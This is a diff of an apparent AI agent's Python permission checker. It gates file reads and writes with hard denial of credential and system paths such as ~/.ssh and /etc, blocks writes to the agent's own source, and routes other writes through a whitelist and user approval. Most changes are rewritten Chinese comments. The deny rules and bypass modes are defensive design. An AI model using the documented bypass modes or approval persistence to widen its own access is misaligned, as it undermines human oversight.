-        规则:
-        - 读:受保护路径(~/.ssh 等)拒,其他允许
-        - 写:
-          闸门 1:受保护路径(~/.ssh / /etc / C:\\Windows 等)→ 硬拒(安全底线)
-          闸门 2:写保护路径(项目代码目录)→ 硬拒(防入侵)
-          闸门 3:写白名单(workspace cwd / ~/.OmniMate / /add-dir 追加的
-                 extra roots)之内放行;之外走审批通道(CCAR14 Task 3):
+        规则(大白话):
+        - 读:碰到受保护路径(~/.ssh 这些)就拒,其他随便读;
+        - 写,三道关卡:
+          闸门 1:受保护路径(~/.ssh / /etc / C:\\Windows 等)→ 硬拒(安全底线);
+          闸门 2:写保护路径(OmniMate 项目代码目录)→ 硬拒(防 AI 改自己);
+          闸门 3:写白名单(工作目录 / ~/.OmniMate / /add-dir 追加的目录)
+                 之内放行;之外走审批通道(CCAR14 Task 3 加的):
                  会话缓存命中放行 → autoDeny 直接拒 → approval_callback
-                 审批(批准后父目录进会话缓存) → 无 callback 拒。
+                 弹窗问用户(批了以后父目录进会话缓存,同目录不再问) →
+                 没配 callback 就拒。
 
-        CCAR13 Task 4: 恢复闸门 3 的白名单语义（dcec556b 曾放开为"其他全通过"，
-        导致 /add-dir 加的额外白名单对 write_file/str_replace 不生效——它们走
-        check_path 而非 safe_path）。白名单经 default_allowed_roots() 统一取：
-        workspace cwd + ~/.OmniMate + _EXTRA_ALLOWED_ROOTS，与 safe_path 同源。
-        顺序铁律：闸门 1/2 在前——白名单加 home 根也写不了 ~/.ssh。
+        历史踩坑(CCAR13 Task 4):闸门 3 的白名单语义曾经被放开成"其他全
+        通过"(commit dcec556b),导致 /add-dir 加的额外目录对 write_file/
+        str_replace 不生效——它们走的是 check_path 而不是 safe_path。后来
+        恢复:白名单统一从 default_allowed_roots() 取(工作目录 + ~/.OmniMate
+        + _EXTRA_ALLOWED_ROOTS,和 safe_path 同一个来源)。
+        顺序铁律:闸门 1/2 排在前——就算往白名单里加了整个家目录,
+        ~/.ssh 也照样写不了。
 
         参数：
-            mode_override: 可选的 mode 覆盖。bypassPermissions 时跳过写保护（项目代码）
-                          之外的写约束（仍受 is_protected_path 硬底线限制）。
+            path: 待检查的路径。
+            write: 是否写操作(默认 False)。
+            allowed_roots: 允许写入的根目录;不传用默认白名单。
+            mode_override: 可选的模式覆盖(语义同 check)。bypassPermissions
+                          时跳过写保护(项目代码)之外的写约束
+                          (is_protected_path 硬底线仍生效)。
+
+        返回:PermissionResult。
         """
-        # 决定本次 check_path 使用的 effective mode
+        # 本次 check_path 用哪个模式(override 优先)
         effective_mode = mode_override or self.mode
 
-        # R16 #2:可疑路径形态前置检查（读写都查、任何模式都拒——安全底线，
-        # 防止 NTFS ADS / 8.3 短名 / 尾点等形态绕过下面的保护表与白名单）
+        # R16 #2:可疑路径形态先查(读写都查、任何模式都拒——安全底线,
+        # 防止 NTFS ADS / 8.3 短名 / 尾点这些花招绕过下面的保护表和白名单)
         susp = check_suspicious_path(path, write=write)
         if susp:
             return self._deny(str(path), f"可疑路径形态: {susp}", "suspicious")
 
-        # 闸门 1:受保护路径硬拒（任何模式下都拒——安全底线）
+        # 闸门 1:受保护路径硬拒(任何模式下都拒——安全底线)
         prot = is_protected_path(path)
         if prot:
             return self._deny(str(path), f"受保护路径: {prot}", "protected")
@@ -1668,17 +1932,18 @@ class PermissionChecker:
             return PermissionResult(True, "ok", "ok")
 
         # 闸门 2:写保护路径(项目代码目录)→ 拒
-        # bypassPermissions 模式下也保留此检查（防 agent 改自身代码）。
-        # CCAR14 Task 1: 此块从 acceptEdits 分支之后上移到之前——闸门 2 是
-        # 全模式硬底线，acceptEdits 不能绕过（否则 cwd 即 agent repo 时
-        # "cwd 内自动放行" 会连自身源码一起批）。
+        # bypassPermissions 模式下也保留这道检查(防 AI 改自身源码)。
+        # 历史踩坑(CCAR14 Task 1):这个块原来排在 acceptEdits 分支后面,
+        # 后来上移到前面——闸门 2 是全模式硬底线,acceptEdits 不能绕过
+        # (否则工作目录恰好是 AI 自己的代码库时,"cwd 内自动放行"会把它
+        # 自己的源码也一起批出去)。
         wprot = is_write_protected_path(path)
         if wprot:
             return self._deny(str(path), f"写保护(项目代码): {wprot}", "protected")
 
-        # acceptEdits: cwd 内写入自动放行
-        # 受保护路径已在闸门 1 拒掉、写保护已在闸门 2 拒掉，
-        # 此处只处理 cwd 内合法写入。
+        # acceptEdits: 工作目录内的写入自动放行
+        # (受保护路径闸门 1 已拒、写保护闸门 2 已拒,
+        # 这里只处理工作目录内的正常写入)
         if effective_mode == "acceptEdits":
             from agent.workspace_context import get_workspace_cwd
             try:
@@ -1687,16 +1952,16 @@ class PermissionChecker:
                 resolved.relative_to(cwd_path)
                 return PermissionResult(True, "acceptEdits: write in cwd", "auto")
             except (ValueError, OSError, RuntimeError):
-                pass  # cwd 外 → 继续走下面的白名单检查
+                pass  # 在工作目录外 → 继续走下面的白名单检查
 
-        # 闸门 3（CCAR13 Task 4）:写白名单。
-        # bypassPermissions 跳过白名单（闸门 1/2 硬底线已在上面守住，
-        # 对齐 test_write_file_respects_agent_ref_bypass_mode 的既有语义）。
+        # 闸门 3(CCAR13 Task 4 恢复):写白名单。
+        # bypassPermissions 跳过白名单(闸门 1/2 硬底线在上面已守住;
+        # 和 test_write_file_respects_agent_ref_bypass_mode 的既有语义对齐)。
         if effective_mode == "bypassPermissions":
             return PermissionResult(True, "ok", "ok")
 
-        # 白名单与 safe_path 同源：workspace cwd + ~/.OmniMate + extra roots。
-        # 调用方显式传 allowed_roots 时以其为准（覆盖默认）。
+        # 白名单和 safe_path 同一个来源:工作目录 + ~/.OmniMate + 额外目录。
+        # 调用方显式传了 allowed_roots 就以其为准(覆盖默认)。
         if allowed_roots is None:
             allowed_roots = default_allowed_roots()
         roots = [Path(p).expanduser().resolve() for p in allowed_roots]
@@ -1713,15 +1978,16 @@ class PermissionChecker:
             except (OSError, ValueError):
                 continue
 
-        # === CCAR14 Task 3: 闸门 3 审批通道（白名单外、最终 deny 之前）===
-        # 与 terminal 命令审批同构：会话缓存 → autoDeny 短路 → callback 审批。
-        # 注意：闸门 1/2（受保护/写保护）在上面已硬拒，不会进这里——
-        # 追加白名单/审批缓存都不能绕过硬底线（安全默认 > 事后补救）。
+        # === CCAR14 Task 3: 闸门 3 的审批通道(白名单外、最终拒绝之前)===
+        # 和 terminal 命令审批同一套:会话缓存 → autoDeny 短路 → callback 问用户。
+        # 注意:闸门 1/2(受保护/写保护)在上面已经硬拒,走不到这里——
+        # 追加白名单/审批缓存都绕不过硬底线(安全默认优先,事后补救就晚了)。
 
-        # 3.1 会话缓存命中：目标路径在已批准的写入根目录下 → 放行
-        # （relative_to 对相等路径也成立，目录本身命中同样放行）
-        # 迭代副本：主线程审批 .add() 与 async 子代理 daemon 线程并发迭代
-        # 会抛 "Set changed size during iteration"（final review Minor）
+        # 3.1 会话缓存命中:目标路径在已批准的写入根目录下 → 放行
+        # (relative_to 对路径相等也成立,批准的目录本身命中同样放行)
+        # 迭代的是副本:主线程审批 .add() 和 async 子代理的后台线程并发
+        # 迭代同一个 set 会抛 "Set changed size during iteration"
+        # (final review 提出的 Minor 问题)
         for approved_root in tuple(self._approved_write_roots):
             try:
                 resolved.relative_to(approved_root)
@@ -1729,8 +1995,8 @@ class PermissionChecker:
             except (OSError, ValueError):
                 continue
 
-        # 3.2 autoDeny：async 子代理（用户不在场）不能弹审批 UI → 直接拒
-        # （对齐 terminal 闸门 3 的 autoDeny 短路语义，fail-closed）
+        # 3.2 autoDeny:async 子代理(用户不在场)没法弹审批窗口 → 直接拒
+        # (和 terminal 闸门 3 的 autoDeny 短路语义对齐,fail-closed)
         if effective_mode == "autoDeny":
             return self._deny(
                 str(path),
@@ -1738,13 +2004,13 @@ class PermissionChecker:
                 "auto_deny",
             )
 
-        # 3.3 default / acceptEdits（cwd 外落到这里）：有 callback → 问用户
-        # callback 签名 fn(item: str) -> bool（与 terminal 共用同一接口），
-        # 类型区分靠消息文本前缀"文件写入审批"（cli.py 的 callback 按内容
-        # 含路径分隔符启发式识别路径分支）。
+        # 3.3 default / acceptEdits(工作目录外落到这里):有 callback → 问用户
+        # callback 签名 fn(item: str) -> bool(和 terminal 共用同一个接口),
+        # 靠消息文本前缀"文件写入审批"区分类型(cli.py 的 callback 按内容
+        # 是否含路径分隔符来识别是路径审批)。
         if self.approval_callback is not None:
-            # Task 3 fix: PERMISSION_REQUEST 审计 + toast（与 terminal 审批点同构）
-            # fail-open：hook / notify 异常不影响审批流程
+            # Task 3 修复补的:PERMISSION_REQUEST 审计 + toast 通知
+            # (和 terminal 的审批点同一套);hook/notify 出异常不影响审批流程
             if self._hooks_registry is not None:
                 try:
                     self._hooks_registry.run_permission_request({
@@ -1763,20 +2029,22 @@ class PermissionChecker:
             try:
                 decision = self.approval_callback(f"文件写入审批: {resolved}")
             except Exception:
-                decision = False  # fail-open：callback 异常按拒绝处理（不崩）
+                decision = False  # fail-open:callback 出异常按拒绝处理(别崩)
 
-            # T5（核心机制对齐第 5 项）："总是允许"档——持久化到 settings.json。
-            # 协议向后兼容：返回 True 视为"本次允许"（仅会话缓存，现状语义）。
+            # T5(核心机制对齐第 5 项):"总是允许"档——持久化到 settings.json。
+            # 协议向后兼容:返回 True 视为"本次允许"(只进会话缓存,老语义)。
             if decision == "always":
                 parent = resolved.parent
-                # 会话缓存 + 运行时白名单（本进程内立即生效，含其他 checker 实例）
-                with self._wl_lock:  # L13：并发审批一致性
+                # 会话缓存 + 运行时白名单(本进程内立即生效,对其他 checker
+                # 实例也生效)
+                with self._wl_lock:  # L13:并发审批一致性
                     self._approved_write_roots.add(parent)
                 try:
                     add_extra_allowed_root(parent)
                 except Exception:
                     pass
-                # 持久化：settings.json security.extra_allowed_roots（与 /add-dir 同通道）
+                # 持久化:写 settings.json 的 security.extra_allowed_roots
+                # (和 /add-dir 走同一条通道)
                 persisted = False
                 try:
                     from agent.settings import persist_extra_allowed_root
@@ -1791,13 +2059,13 @@ class PermissionChecker:
 
             approved = bool(decision)
             if approved:
-                # 批准：父目录进会话缓存，同目录后续写入不再询问
-                with self._wl_lock:  # L13
+                # 批了:父目录进会话缓存,同目录后续写入不再问
+                with self._wl_lock:  # L13 并发一致性
                     self._approved_write_roots.add(resolved.parent)
                 return PermissionResult(True, "已批准（写入根目录）", "approval")
             return self._deny(str(path), "用户拒绝", "approval")
 
-        # 3.4 无 callback → 拒（现状，消息含允许根）
+        # 3.4 没配 callback → 拒(拒绝消息里带上允许的根目录,方便排查)
         return self._deny(
             str(path),
             f"写入路径不在白名单: {resolved}（允许: {[str(r) for r in roots]}）",
@@ -1805,13 +2073,23 @@ class PermissionChecker:
         )
 
     def add_to_whitelist(self, command: str):
-        """手动加入持久化白名单。"""
+        """手动往持久化白名单加一条命令(如 /approved 命令用)。
+
+        参数:
+            command: 要加的命令。
+        """
         with self._wl_lock:
             self._persistent_whitelist.add(command.strip())
         self._save_whitelist()
 
     def remove_from_whitelist(self, command: str) -> bool:
-        """从持久化白名单移除。返回是否找到并移除。"""
+        """从持久化白名单移除一条。
+
+        参数:
+            command: 要移除的命令。
+
+        返回:True 表示找到并移除了;False 表示本来就不在白名单里。
+        """
         with self._wl_lock:
             before = len(self._persistent_whitelist)
             self._persistent_whitelist.discard(command.strip())
@@ -1822,40 +2100,50 @@ class PermissionChecker:
         return False
 
     def list_whitelist(self) -> list:
-        """列出持久化白名单（排序）。"""
+        """列出持久化白名单(排好序返回)。"""
         return sorted(self._persistent_whitelist)
 
     def reset_cache(self):
-        """清空会话内缓存（不影响持久化白名单）。"""
+        """清空会话内缓存(持久化白名单不动)。
+
+        为什么需要:审批缓存是会话级的,新会话/测试要重置,避免长期信任漂移。
+        """
         self._approved.clear()
-        # CCAR14 Task 3: 写入根目录审批缓存同样是会话级，一并清空
+        # CCAR14 Task 3:写入根目录的审批缓存同样是会话级的,一并清
         self._approved_write_roots.clear()
 
     def set_sandbox_mode(self, mode: str) -> None:
-        """切换 OS 沙箱模式（/sandbox 命令调）。
+        """切换 OS 沙箱模式(/sandbox 命令调用)。
 
         参数：
-            mode: "off" 关闭（默认）或 "on" 开启。
-                  on 时 terminal_tool 会把命令包进 bwrap/seatbelt wrapper。
-                  不可用时走 fail-open 降级（警告 + 原路径）。
+            mode: "off" 关闭(默认)或 "on" 开启。
+                  on 的时候 terminal_tool 会把命令包进沙箱 wrapper 里跑
+                  (Linux 用 bwrap、macOS 用 seatbelt、Windows 用 Job Object)。
+                  沙箱不可用时降级(fail-open:警告一声,走原路径执行)。
 
         异常：
-            ValueError: mode 不在 ("off", "on") 中。
+            ValueError: mode 不是 "off"/"on" 之一。
         """
         if mode not in ("off", "on"):
             raise ValueError(f"非法 sandbox_mode: {mode}（仅支持 off / on）")
         self.sandbox_mode = mode
 
 
-# 全局默认 checker（无审批，只走闸门 1/2）
+# 全局默认 checker(没配审批 callback,只走硬性闸门)——工具层拿不到
+# 定制 checker 时的兜底
 _default_checker = PermissionChecker()
 
 
 def get_default_checker() -> PermissionChecker:
+    """取全局默认 checker(见上方模块级变量的说明)。"""
     return _default_checker
 
 
 def set_default_checker(checker: PermissionChecker) -> None:
-    """设置全局默认 checker（CLI 启动时调用，注入审批 callback）。"""
+    """换成指定的全局默认 checker(CLI 启动时调用,注入带审批 callback 的实例)。
+
+    参数:
+        checker: 新的 checker 实例。
+    """
     global _default_checker
     _default_checker = checker
